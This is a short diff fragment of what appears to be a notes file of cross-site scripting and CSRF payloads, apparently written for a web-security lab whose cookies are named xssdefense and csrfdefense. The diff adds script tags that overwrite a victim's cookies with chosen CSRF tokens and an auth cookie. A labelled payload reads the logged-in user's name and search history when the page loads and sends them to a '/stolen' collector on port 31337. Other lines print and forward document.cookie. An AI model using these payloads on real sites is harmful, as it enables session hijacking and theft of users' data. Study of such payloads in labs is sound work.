@@ -49,7 +49,10 @@ xhr.setRequestHeader('Content-Type', '');xhr.send(JSON.stringify({value: value})
 window.location.href=send;
 
 console.log(decodeURIComponent(document.cookie))
-
+<script>document.cookie = 'xssdefense=0; csrfdefense=1; csrf_token=29e18efaa37226e88e3a1bef69227a6c; authuser="!yosB8SHk7hK7KR2EKsVS+A==?gAJVCGF1dGh1c2VycQFVCGF0dGFja2VycQKGcQMu"; _gauges_unique_month=1; _gauges_unique_year=1; _gauges_unique=1; _gauges_unique_hour=1; _gauges_unique_day=1; expires=Thu, 18 Dec 2020 12:00:00 UTC'</script>
+document.cookie = "username=John Doe; expires=Thu, 18 Dec 2013 12:00:00 UTC";
+<script>document.cookie='csrf_token=9f06e550e78ee7e297073fc935e72b1a'</script>
+9f06e550e78ee7e297073fc935e72b1a
 Number 1:
 <script>window.onload = function () {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()}</script>
 Number 2:
